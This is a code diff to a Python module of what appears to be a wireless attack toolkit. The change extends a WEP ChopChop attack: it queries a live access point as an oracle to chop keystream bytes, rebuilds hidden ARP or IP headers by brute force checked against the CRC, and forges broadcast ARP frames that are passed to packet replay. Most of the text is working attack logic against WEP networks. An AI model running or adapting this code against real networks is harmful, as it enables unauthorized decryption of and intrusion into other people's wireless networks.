@@ -23,12 +23,20 @@ the AP doesn't discard invalid-ICV frames and chopchop can't work — we say so
 rather than failing silently (aireplay-ng.c, the ``h80211[5] & 1`` check).
 
 Keystream recovery (the offline-testable core): the keystream is fixed per IV,
-so each accepted guess gives ks[i] = body[i] XOR guess, recovered end-inward.
-The first 16 plaintext bytes of a broadcast ARP are known (LLC/SNAP +
-ARP-request header), so we chop only the variable tail and fill ks[0..15] from
-the known prefix — which also avoids chopping below the AP's drop-short wall.
-If the wall leaves a 1-byte gap above the prefix, we recover it by brute-forcing
-the keystream byte over 256 full-length forged ARPs (same tag-and-read-back).
+so each accepted guess gives ks[i] = body[i] XOR guess, recovered end-inward. We
+chop to the AP's drop-short wall, then reconstruct the hidden head from known
+structure — confirmed offline against the captured frame's OWN ICV, no AP round-
+trip (aireplay-ng's header_rec):
+  - ARP: LLC/SNAP + ARP-request header is known through byte 15. A wall one byte
+    into the (unknown) sender MAC has that single byte recovered from the AP.
+  - IP (any broadcast IP datagram): LLC/SNAP + IP version/IHL + TOS + total-
+    length cover bytes 0..11 — version/IHL and TOS are brute-forced (16×256),
+    total-length is computed from the frame size, all confirmed by the CRC. This
+    needs the AP to relay down to a <=12-byte cipher; a deeper wall hides
+    genuinely-unknown IP fields (id / flags / TTL / …) we can't derive.
+Either way the output is a forged broadcast ARP (we only need ~40 keystream
+bytes for the IV) handed to replay — the seed type only changes how the head is
+recovered.
 
 Lifecycle mirrors WepFragmentation (start/stop/state, on_forged_arp, keep-
 retrying). The campaign pauses replay before running this and resumes it on
@@ -41,10 +49,12 @@ import asyncio
 import logging
 import random
 import time
+import zlib
 from typing import Awaitable, Callable, Optional
 
 from wifit3.engine.models import AccessPoint
 from wifit3.engine.attacks.wep.wep_crypto import (
+    CRC32_RESIDUE,
     arp_request_plaintext,
     chop_last_byte_and_fixup,
     icv,
@@ -63,6 +73,18 @@ _KNOWN_ARP16 = bytes([
     0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06,
     0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01,
 ])
+# LLC/SNAP header (always-known plaintext for ANY 802.11 data frame); the next
+# 2 bytes are the ethertype (0x0806 ARP / 0x0800 IP) that says what follows.
+_KNOWN_SNAP = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00])
+_ETHERTYPE_IP = bytes([0x08, 0x00])
+# Stop chopping once only SNAP+ethertype (bytes 0..7) would remain — that's
+# always-known structure, nothing to gain by chopping into it.
+_CHOP_FLOOR = 8
+# IP header reconstruction (aireplay's header_rec) covers bytes 0..11 only:
+# SNAP + IP version/IHL + TOS + total-length. A wall deeper than this would hide
+# genuinely-unknown IP fields (id / flags / TTL / …) we can't derive, so an IP
+# seed is usable only when the AP relays down to a <=12-byte cipher.
+_IP_MAX_WALL = 12
 # Sentinel "guess" — not a byte value (0..255), but a flag the oracle returns
 # when the AP relayed a deliberately-bad-ICV frame (→ AP isn't vulnerable).
 _SENTINEL = 256
@@ -197,8 +219,10 @@ class WepChopChop:
         return body[:3], body[3], body[4:]
 
     def _pick_target(self):
-        """Choose a not-yet-stalled captured broadcast ARP to chop."""
-        for raw in reversed(self.store.arp_candidates(self.bssid)):
+        """Choose a not-yet-stalled captured broadcast data frame to chop (ARP
+        or IP — the chop is protocol-agnostic; only the head reconstruction
+        differs)."""
+        for raw in reversed(self.store.chop_candidates(self.bssid)):
             parsed = self._wep_body(raw)
             if not parsed:
                 continue
@@ -207,10 +231,10 @@ class WepChopChop:
                 continue
             self._cur_iv, self._cur_keyid, self._cur_cipher = iv, keyid, cipher
             self._bytes_done = 0
-            self._bytes_total = len(cipher) - len(_KNOWN_ARP16)
+            self._bytes_total = len(cipher) - _CHOP_FLOOR
             self._log(
                 f"[green]ChopChop:[/green] chopping IV {iv.hex()} "
-                f"[dim]({len(cipher)}B cipher, {self._bytes_total} bytes to "
+                f"[dim]({len(cipher)}B cipher, ~{self._bytes_total} bytes to "
                 f"recover)[/dim]"
             )
             return cipher
@@ -219,21 +243,23 @@ class WepChopChop:
     # ---- The byte-walk: linear, identity read from each relay ---------------
 
     async def _chop_and_forge(self, cipher: bytes) -> Optional[bytes]:
-        """Recover the keystream by chopping ``cipher`` down to the known ARP
-        prefix — reading each accepted byte out of the AP's relay tag — then
-        forge + return a broadcast ARP from the recovered keystream, or None.
+        """Chop ``cipher`` down to the AP's drop-short wall — reading each
+        accepted byte out of the relay tag — then reconstruct the hidden head
+        from known structure (ARP or IP), verified against the captured frame's
+        own CRC, and forge a broadcast ARP from the recovered keystream. Returns
+        the ARP, or None.
 
         Linear (no DFS): the relay's MAC tag tells us exactly which guess the AP
         accepted, so there's no ambiguity to backtrack over."""
-        nknown = len(_KNOWN_ARP16)
-        if len(cipher) < nknown + 4:
-            return None
-        known_ks = bytes(cipher[i] ^ _KNOWN_ARP16[i] for i in range(nknown))
         full_len = len(cipher)
+        if full_len < 40:                  # need >=40 ks bytes to forge the ARP
+            return None
         body = bytes(cipher)
         ks_map: dict = {}                  # {position: recovered keystream byte}
 
-        while self._active and len(body) > nknown:
+        # Chop from the end until the drop-short wall (or the always-known SNAP+
+        # ethertype floor — no point chopping bytes structure already gives us).
+        while self._active and len(body) > _CHOP_FLOOR:
             self._bytes_done = max(self._bytes_done, full_len - len(body))
             self._maybe_heartbeat()
             guess = await self._oracle(body)
@@ -245,21 +271,17 @@ class WepChopChop:
                 )
                 return None
             if guess is None:
-                # No relay: the drop-short wall (a small brute-forceable gap
-                # remains just above the prefix) or the AP went quiet.
-                gap = list(range(nknown, len(body)))
-                if 0 < len(gap) <= self._MAX_BRUTE_BYTES:
-                    return await self._build_and_forge(
-                        ks_map, known_ks, full_len, gap
-                    )
-                return None
+                break                      # the drop-short wall
             pos = len(body) - 1
             ks_map[pos] = body[-1] ^ guess
             body = chop_last_byte_and_fixup(body, guess)
 
         if not self._active:
             return None
-        return await self._build_and_forge(ks_map, known_ks, full_len, [])
+        ks = await self._recover_head(cipher, ks_map, len(body))
+        if ks is None:
+            return None
+        return self._forge_arp(ks)
 
     # ---- Live-AP oracle: tag the guess, read it back from the relay ---------
 
@@ -399,45 +421,113 @@ class WepChopChop:
         except asyncio.CancelledError:
             pass
 
-    async def _build_and_forge(self, ks_map, known_ks, full_len, gap) -> Optional[bytes]:
-        """Assemble the recovered keystream (chopped bytes + known prefix), forge
-        a broadcast ARP, and return it. No AP round-trip needed: correct
-        keystream → a valid frame by construction (replay will confirm IVs
-        flow). A ``gap`` (the drop-short wall left a keystream byte unreachable)
-        is recovered by brute-forcing that cipher byte over 256 tagged
-        full-length forged ARPs. Returns the broadcast ARP, or None."""
-        nknown = len(known_ks)
-        ks = bytearray(full_len)
-        for pos, val in ks_map.items():
-            ks[pos] = val
-        ks[:nknown] = known_ks
+    async def _recover_head(self, cipher: bytes, ks_map: dict,
+                            wall_l: int) -> Optional[bytearray]:
+        """Reconstruct the keystream for the hidden head [0..wall_l-1] (the bytes
+        below the AP's drop-short wall) from known frame structure, confirmed
+        against the captured frame's OWN ICV — no AP needed for the
+        verification (aireplay-ng's header_rec). Returns the full keystream, or
+        None.
 
+        Two shapes (try ARP, then IP):
+          - ARP: LLC/SNAP + ARP-request header is known through byte 15. If the
+            wall sits one byte into the (unknown) sender MAC, that single byte is
+            recovered from the AP (it's real data, not derivable).
+          - IP: LLC/SNAP + IP version/IHL + TOS + total-length cover bytes 0..11
+            — version/IHL and TOS are brute-forced (16×256) and total-length is
+            computed from the frame size, all confirmed offline by the CRC. Only
+            viable when the wall is shallow (<=12); a deeper wall hides
+            genuinely-unknown IP fields."""
+        n = len(cipher)
+
+        def ks_with(head: bytes) -> bytearray:
+            ks = bytearray(n)
+            for p, v in ks_map.items():
+                ks[p] = v
+            for i, p in enumerate(head):
+                ks[i] = cipher[i] ^ p
+            return ks
+
+        def crc_ok(ks: bytes) -> bool:
+            plain = bytes(c ^ k for c, k in zip(cipher, ks))
+            return (zlib.crc32(plain) & 0xFFFFFFFF) == CRC32_RESIDUE
+
+        # ---- ARP (the common broadcast case) ----
+        nknown = len(_KNOWN_ARP16)
+        if wall_l <= nknown:
+            ks = ks_with(_KNOWN_ARP16[:wall_l])
+            if crc_ok(ks):
+                return ks
+        elif wall_l <= nknown + self._MAX_BRUTE_BYTES:
+            # The wall left one genuinely-unknown byte (sender-MAC start) between
+            # the known ARP header and the wall — recover it from the AP.
+            ks = ks_with(_KNOWN_ARP16)
+            ksb = await self._ap_brute_byte(ks, nknown)
+            if ksb is not None:
+                ks[nknown] = ksb
+                if crc_ok(ks):
+                    return ks
+
+        # ---- IP (any broadcast IP datagram) — header reconstruction ----
+        if wall_l <= _IP_MAX_WALL:
+            if wall_l > _CHOP_FLOOR:
+                self._log(
+                    "[green]ChopChop:[/green] [dim]not an ARP — reconstructing "
+                    "the IP header (offline CRC search)…[/dim]"
+                )
+            totlen = n - 12                # IP datagram length (see module notes)
+            base = _KNOWN_SNAP + _ETHERTYPE_IP                  # bytes 0..7
+            vihl_range = range(0x40, 0x50) if wall_l > 8 else (0x45,)
+            tos_range = range(256) if wall_l > 9 else (0x00,)
+            for vihl in vihl_range:
+                for tos in tos_range:
+                    head = base + bytes([vihl, tos,
+                                         (totlen >> 8) & 0xFF, totlen & 0xFF])
+                    ks = ks_with(head[:wall_l])
+                    if crc_ok(ks):
+                        return ks
+        return None
+
+    async def _ap_brute_byte(self, ks: bytearray, p: int) -> Optional[int]:
+        """Recover one genuinely-unknown keystream byte at position ``p`` from
+        the AP: forge our (fully-known-plaintext) ARP, vary cipher[p] over 256
+        tagged candidates, and read back the one that relays. ``ks`` must be
+        known for every forged-ARP position except ``p``."""
+        self._log(
+            "[green]ChopChop:[/green] [dim]drop-short wall — recovering the "
+            "boundary byte from the AP (256 forged ARPs)…[/dim]"
+        )
         plain = arp_request_plaintext(
             sender_mac=self.source_mac,
             sender_ip=self._sender_ip, target_ip=self._target_ip,
         )
-        full = plain + icv(plain)                          # 40 B known plaintext
-        cipher = bytearray(p ^ ks[i] for i, p in enumerate(full))
+        full = plain + icv(plain)                              # 40 B
+        if p >= len(full):
+            return None
+        base = bytearray(f ^ ks[i] for i, f in enumerate(full))
 
-        if gap:
-            p = gap[0]                                     # _MAX_BRUTE_BYTES == 1
-            self._log(
-                "[green]ChopChop:[/green] [dim]drop-short wall hit — brute-"
-                "forcing the last keystream byte (256 forged ARPs)…[/dim]"
-            )
-
-            def candidate(guess: int) -> bytes:
-                if guess == _SENTINEL:
-                    return bytes(cipher[:p]) + b"\x00" + bytes(cipher[p + 1:])
-                c = bytearray(cipher)
-                c[p] = guess
+        def candidate(guess: int) -> bytes:
+            c = bytearray(base)
+            if guess == _SENTINEL:
+                c[-1] ^= 0xFF                 # corrupt the ICV → AP must drop it
                 return bytes(c)
-            accepted = await self._sweep_for_relay(candidate)
-            if accepted is None or accepted == _SENTINEL:
-                return None
-            cipher[p] = accepted
+            c[p] = guess
+            return bytes(c)
+        accepted = await self._sweep_for_relay(candidate)
+        if accepted is None or accepted == _SENTINEL:
+            return None
+        return full[p] ^ accepted
 
-        return self._forge_frame(bytes(cipher), _BROADCAST)
+    def _forge_arp(self, ks: bytearray) -> bytes:
+        """Forge a broadcast ARP request from us, encrypted with the recovered
+        keystream (reusing the chop target's IV) — the seed we hand to replay."""
+        plain = arp_request_plaintext(
+            sender_mac=self.source_mac,
+            sender_ip=self._sender_ip, target_ip=self._target_ip,
+        )
+        full = plain + icv(plain)
+        cipher = bytes(p ^ ks[i] for i, p in enumerate(full))
+        return self._forge_frame(cipher, _BROADCAST)
 
     def _succeed(self, forged: bytes) -> None:
         self._set_state("success")
